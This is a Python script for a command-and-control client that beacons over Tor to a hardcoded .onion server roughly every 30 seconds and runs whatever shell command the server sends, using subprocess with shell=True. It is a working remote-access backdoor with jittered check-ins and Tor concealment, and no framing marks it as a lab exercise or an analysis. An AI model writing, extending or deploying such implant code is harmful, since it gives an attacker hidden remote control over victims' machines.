#!/usr/bin/python3
import requests
import time
import subprocess
import random

class C2Client:
    def __init__(self, onion_address):
        self.c2_url = f"http://{onion_address}"
        self.client_id = "client_001"

        # Windows Tor Browser uses port 9150
        self.proxies = {
            'http': 'socks5h://127.0.0.1:9150',
            'https': 'socks5h://127.0.0.1:9150'
        }

    def checkin(self):
        try:
            print("Checking in with C2 server...")
            response = requests.post(
                f"{self.c2_url}/checkin",
                json={'client_id': self.client_id},
                proxies=self.proxies,
                timeout=30
            )
            print(f"Server response: {response.status_code}")
            if response.status_code == 200:
                data = response.json()
                return data.get('command')
        except Exception as e:
            print(f"Connection error: {e}")
            return None

    def execute_command(self, command):
        if command == 'wait':
            return "Waiting for commands..."
        elif command == 'get_info':
            import platform
            info = f"System: {platform.system()} {platform.release()}"
            return info
        elif command.startswith('run:'):
            try:
                cmd = command[4:]
                print(f"Executing: {cmd}")
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                return result.decode('utf-8')
            except Exception as e:
                return f"Error: {str(e)}"
        else:
            return f"Unknown Command: {command}"

    def start(self):
        print("Client Started. Checking in with C2 server....")
        while True:
            command = self.checkin()
            if command:
                print(f"Received command: {command}")
                result = self.execute_command(command)
                print(f"Command result: {result}")
            else:
                print("No command received")

            sleep_time = 30 + random.randint(-5, 5)  # 30 seconds for testing
            time.sleep(sleep_time)

if __name__ == '__main__':
    client = C2Client("sg5c732eqvfe55cyid3y3tht6mmjn4ckde2m33xkokvlcqffsutu5gyd.onion")
    client.start()